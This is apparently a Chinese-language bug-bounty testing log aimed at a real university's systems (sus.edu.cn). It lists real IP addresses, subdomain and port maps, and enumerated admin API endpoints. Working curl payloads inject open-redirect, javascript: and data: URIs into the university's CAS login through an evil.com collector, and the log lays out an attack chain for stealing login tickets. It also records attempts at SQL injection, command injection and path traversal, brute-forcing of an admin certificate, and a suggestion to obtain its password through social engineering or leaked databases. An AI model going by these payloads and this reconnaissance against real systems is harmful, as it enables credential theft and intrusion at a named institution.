# 上海体育大学 sus.edu.cn 测试记录 (2026-06-07) — 第二轮+第三轮

## 核心教训: 从被拒到有效的升级路径

**第一轮(06-05)全部被拒:** 6份报告(VPN版本泄露/企业微信配置泄露/邮箱用户枚举/VPN配置泄露/安全头缺失/DMARC)全是信息泄露/配置缺陷，SRC全部驳回。

**第二轮+第三轮(06-07)策略:** 放弃所有低价值信息泄露，只找有攻击链的实质性漏洞。

**关键规则:**
- SRC只接受有**攻击链+实际影响**的漏洞
- "版本泄露"、"配置泄露"、"用户枚举"、"安全头缺失" = 全部被拒
- "Open Redirect + 凭证窃取" = 有攻击链，可提交
- 判断标准: 能否构造一个链接让受害者的资产受损？

**第三轮结论:** 目标安全防护水平较高，所有API需Bearer token认证，登录有验证码+IP锁定，Go后端无SQL注入，VPN无可利用CVE。CAS Open Redirect是最有价值的发现但SRC可能仍认为危害不足。

---

## 关键突破: DNS不可达但IP可达

authserver.sus.edu.cn DNS解析到保留IP(198.18.x.x)或超时，但通过IP直接访问可行:

```bash
curl -sk 'https://101.231.216.210/authserver/login' -H 'Host: authserver.sus.edu.cn'
```

**教训:** DNS解析失败不代表服务不可达。尝试:
1. 历史DNS查询(hackertarget/securitytrails)
2. 同C段IP扫描
3. 其他子域IP推断
4. 直接IP + Host头

---

## CAS Open Redirect + javascript:URI注入 (高危)

**系统:** 金智教育CAS (wisedu), 主题 `sus_20250410`

### 5个已确认攻击向量

**1. 任意外部域名 (Open Redirect)**
```bash
curl -sk 'https://101.231.216.210/authserver/login?service=https://evil.com/collect' -H 'Host: authserver.sus.edu.cn' | grep 'var service'
# 返回: var service = "https://evil.com/collect";
```

**2. javascript:URI注入 (页面JS上下文)**
```bash
curl -sk 'https://101.231.216.210/authserver/login?service=javascript:alert(1)' -H 'Host: authserver.sus.edu.cn' | grep 'var service'
# 返回: var service = "javascript:alert(1)";
```

**3. data:URI注入**
```bash
curl -sk 'https://101.231.216.210/authserver/login?service=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' -H 'Host: authserver.sus.edu.cn' | grep 'var service'
# 返回: var service = "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";
```

**4. 协议无关URL**
```bash
curl -sk 'https://101.231.216.210/authserver/login?service=//evil.com/' -H 'Host: authserver.sus.edu.cn' | grep 'var service'
# 返回: var service = "//evil.com/";
```

**5. 嵌套URL (绕过简单白名单)**
```bash
curl -sk 'https://101.231.216.210/authserver/login?service=https://susbook.sus.edu.cn/callback?redirect=https://evil.com/' -H 'Host: authserver.sus.edu.cn' | grep 'var service'
# 返回: var service = "https://susbook.sus.edu.cn/callback?redirect=https://evil.com/";
```

### 攻击链
1. 攻击者构造: `https://authserver.sus.edu.cn/authserver/login?service=https://evil.com/collect`
2. 用户点击后看到正规CAS登录页面(域名是学校官方)
3. 用户输入账号密码登录
4. CAS重定向到: `https://evil.com/collect?ticket=ST-XXXXX`
5. 攻击者获取ticket，使用该ticket登录所有接入CAS的校内系统

### CAS系统特征
- FIDO启用: `_fidoEnabled="true"`
- 验证码启用: `captchaSwitch="1"`
- 账号锁定: 5次失败后锁定(`_badCredentialsCount="5"`)
- REST API: `/authserver/v1/tickets` 返回401
- service参数直接注入到页面JS变量 `var service = "..."`

---

## Shibboleth IdP (idp.sus.edu.cn:8443)

**系统:** Carsi教育网统一认证与资源共享
**服务器:** Apache
**Entity ID:** https://idp.sus.edu.cn/idp/shibboleth
**Scope:** sus.edu.cn

| 端点 | 状态 | 说明 |
|------|------|------|
| /idp/shibboleth | 200 | 完整SAML元数据+X509签名证书 |
| /idp/profile/cas/login | 500 | ServiceNotSpecified |
| /idp/profile/cas/serviceValidate | 200 | E_TICKET_NOT_SPECIFIED / E_ILLEGAL_STATE |
| /idp/profile/SAML2/SOAP/ArtifactResolution | 200 | 返回Success但不实际处理请求 |
| /idp/profile/admin/resolvertest | 200 | {"error":"UnableToDecode"} |
| /idp/profile/admin/reload-service | 403 | Access Denied |
| /idp/profile/admin/metrics | 403 | Access Denied |

**未成功利用:** SOAP端点不解析XXE, CAS ticket伪造返回E_ILLEGAL_STATE, admin端点403。

---

## NIC/XXB后台 (nic.sus.edu.cn / xxb.sus.edu.cn :8443)

- 多因素认证: 需要PFX客户端证书+密码
- PFX证书: `/sysAdmin.pfx` 可下载 (4559字节)
- 密码: 未知(常见密码字典均失败, john破解超时)
- 认证说明: "请下载并安装身份证书后再访问，密码请联系管理员获取"
- 所有路径均返回相同的多因素认证提示页面

---

## API端点枚举 (从JS文件提取)

### susbook.sus.edu.cn
前端: `/assets/index-CnzPDYDC.js` (1.8MB)
认证: Bearer token (localStorage key: `sportsVenueToken`)
登录: POST /api/login (Basic Auth header)

**公开/用户端点:**
- GET /api/users/me — 当前用户信息(401未登录)
- GET /api/wecom/login — WeCom登录(返回corphint泄露)
- GET /api/stadium/get_stadium_and_site_count — 场馆数量
- POST /api/stadium/reserve/add — 添加预约
- POST /api/stadium/reserve/add_official — 官方预约
- GET /api/stadium/reserve/check_qualification — 资格检查
- GET /api/stadium/reserve/get_schedule — 排程
- GET /api/stadium/reserve/list_my — 我的预约
- GET /api/stadium/reserve/list_paged — 分页预约列表

**管理端点 (全部需认证):**
- GET /api/tview/data/v_admin_panel/get?id=default — 管理面板
- GET /api/tview/data/v_users_panel/get?id=default — 用户面板
- GET /api/tview/data/v_verified_panel/get?id=default — 认证面板
- GET /api/tview/data/system_settings/list — 系统设置
- POST /api/tview/data/system_settings/update — 更新设置
- GET /api/tview/data/v_stadium_site_lock_rule/list — 锁定规则
- GET /api/tview/data/v_stadium_site_lock_temp_rule/list — 临时锁定规则
- POST /api/stadium/reserve/lock_rule/add_exclude_date — 排除日期

### jingyunkeyan.sus.edu.cn
前端: `/assets/index-0WSzgisw.js` (995KB)
认证: Bearer token

**管理端点 (全部需认证):**
- /api/tview/data/equipment/{add,delete,update,list} — 设备CRUD
- /api/tview/data/stadium/{add,delete,update,list} — 场馆CRUD
- /api/tview/data/stadium_site/{add,delete,update,list} — 站点CRUD
- /api/tview/data/stadium_site_lock_rule/{add,delete,update,list} — 锁定规则CRUD
- /api/tview/data/news/{add,delete,update,list} — 新闻CRUD
- /api/tview/data/tview_users/{add,list} — 用户管理
- /api/tview/data/v_equipment_current_amount/list — 设备数量
- /api/tview/files/{parse,preupload,upload} — 文件上传
- /api/equipment/reserve/{add,list_paged,list_paged_my,return_equipment,verify} — 设备预约
- /api/flow/review_task/{list_paged,list_paged_by_tag_key,review} — 审核任务

---

## SPA "全部200" fallback检测方法

Go+Vue SPA架构下, 所有路径(包括随机不存在的路径)都返回200和相同的HTML。
检测方法:
```bash
# 比较随机路径与已知API端点的响应
curl -sk 'https://susbook.sus.edu.cn/nonexistent12345' | head -1  # HTML → SPA fallback
curl -sk 'https://susbook.sus.edu.cn/api/users/me' | head -1     # JSON → 真实API
```
真实API端点返回JSON: `{"ret":404,"error":"请检查路由是否正确"}` 或 `{"ret":401,"error":"未登录或登录已过期"}`
SPA fallback返回完整HTML页面(包含`<!DOCTYPE html>`)

---

## VPN深度测试结果

**版本:** M7.6.8R2 (客户端 7.6.7.4)
**受SF-PSIRT-20220032影响:** M7.5-M7.6.9R2 (CVSS 9.8)

**未成功利用:**
- login_psw.csp POST返回通用XML ErrorCode=20026 "User has not logged in yet"
- login_auth.csp的url/host参数返回通用"login auth success" — 不是真正SSRF
- 路径遍历: ../../../etc/passwd → Error Page HTML
- 命令注入: ;id, |id, `id`, $(id) → 通用XML响应

**仍泄露的信息:**
```bash
curl -sk 'https://vpn.sus.edu.cn/por/login_auth.csp' | grep -E 'VPNVERSION|RSA_ENCRYPT_KEY|CSRF_RAND_CODE|EC'
```

---

## 深度测试结果汇总 (全部未成功)

1. **SQL注入**: susbook/jingyunkeyan/CAS — 无SQL错误, 无时间盲注
2. **VPN RCE**: login_psw.csp — 通用XML响应, 无命令注入
3. **VPN SSRF**: login_auth.csp — 通用响应, 不处理URL
4. **未授权API**: 所有 /api/tview/data/* — 返回401
5. **XXE**: Shibboleth SOAP — 不解析外部实体
6. **弱密码**: CAS有验证码+5次锁定, 邮箱有验证码
7. **PFX证书**: sysAdmin.pfx — 密码未知, john超时
8. **文件上传**: /api/tview/files/upload — 需认证
9. **SSRF**: 无开放端点
10. **路径遍历**: VPN — Error Page, 无遍历

---

## 已确认死路 (不要再花时间)

1. Go后端SQL注入 — Go框架默认参数化查询
2. VPN RCE — 需特定条件, 纯黑盒无法利用
3. SPA子域管理端点未授权 — 全部需Bearer token
4. CAS弱密码爆破 — 有验证码+锁定
5. PFX证书暴力破解 — 密码复杂度高
6. Shibboleth SOAP XXE/SSRF — 不实际处理请求

---

## IP地址映射

| 子域 | IP | 端口 |
|------|-----|------|
| 主站 | 101.231.216.206 | 80 |
| authserver | 101.231.216.210 | 443 |
| VPN | 101.231.216.135 | 80/443 |
| susbook/jingyunkeyan | 124.223.216.16 | 80/443 |
| admission | 8.210.231.102 | 22/80/443 |
| nic/xxb | 60.204.193.12 | 443/8443 |
| idp | 219.220.200.10 | 80/443/8443 |
| 邮件 | 111.124.200.49 | 25/80/110/143/443/465/587/993/995 |

---

## 仍可尝试的方向

1. 浏览器实际测试CAS javascript:URI的XSS效果(需要渲染页面)
2. PFX密码从其他渠道获取(社工/泄露数据库)
3. CAS ticket伪造(需找到signing key)
4. 内网其他服务(通过VPN或SSRF)
5. IP锁定过期后用不同用户名字典
6. 校内其他系统(如教务/图书馆)的CAS登录后越权测试

---

## 推荐提交顺序

1. **CAS Open Redirect (高危)** — 有完整攻击链，可窃取凭证
2. **VPN版本+RSA密钥+CSRF token (中危)** — 多项信息泄露组合
3. **用户枚举 (低危)** — 大概率被拒，仅作补充
